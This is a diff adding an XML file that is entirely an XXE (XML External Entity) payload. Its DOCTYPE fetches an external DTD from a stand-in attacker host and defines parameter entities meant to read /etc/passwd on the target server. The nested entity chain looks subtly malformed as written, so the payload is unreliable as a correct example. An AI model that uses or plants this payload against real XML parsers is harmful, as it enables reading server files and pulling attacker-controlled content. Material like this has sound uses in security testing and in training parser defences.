@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+        <!ENTITY % one SYSTEM "http://attacker.tld/dtd-part" >
+        %one;
+        %two;
+        %four;
+        ]>
+
+        ## External dtd: ##
+
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:///%three;'>">
